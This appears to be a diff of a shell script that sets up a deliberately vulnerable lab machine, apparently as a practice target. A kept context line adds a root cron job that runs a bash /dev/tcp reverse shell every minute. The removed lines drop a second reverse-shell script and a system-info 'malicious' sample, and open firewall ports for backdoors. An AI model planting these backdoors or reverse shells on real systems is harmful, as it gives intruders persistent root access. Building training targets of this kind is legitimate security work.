@@ -113,24 +113,3 @@ systemctl start vuln-backdoor.service >> $LOGFILE 2>&1
 echo "[$TIMESTAMP] Creating backdoor cron job..." >> $LOGFILE
 echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4445 0>&1'" >> /etc/crontab
 systemctl restart cron >> $LOGFILE 2>&1
-
-# Payload Dumping: Sample malicious scripts/binaries (T1005)
-echo "[$TIMESTAMP] Dumping payloads to $PAYLOAD_DIR..." >> $LOGFILE
-cat > $PAYLOAD_DIR/malicious.sh << 'EOL'
-#!/bin/bash
-# Sample malicious payload: Logs system info
-whoami > /tmp/vuln-payloads/whoami.txt
-uname -a >> /tmp/vuln-payloads/sysinfo.txt
-EOL
-chmod +x $PAYLOAD_DIR/malicious.sh
-echo "bash -i >& /dev/tcp/0.0.0.0/4446 0>&1" > $PAYLOAD_DIR/reverse-shell.sh
-chmod +x $PAYLOAD_DIR/reverse-shell.sh
-echo "[$TIMESTAMP] Payloads dumped: malicious.sh, reverse-shell.sh" >> $LOGFILE
-
-# Firewall: Open ports for exploits and backdoors
-ufw allow 22,80,139,445,3389,8080,993,21,4444,4445,4446 >> $LOGFILE 2>&1
-ufw --force enable >> $LOGFILE 2>&1
-
-echo "[$TIMESTAMP] Installation complete! Vulnerable services, backdoors, and payloads installed." >> $LOGFILE
-echo "Target IP: $(hostname -I | awk '{print $1}')"
-echo "Logs: $LOGFILE, Payloads: $PAYLOAD_DIR"
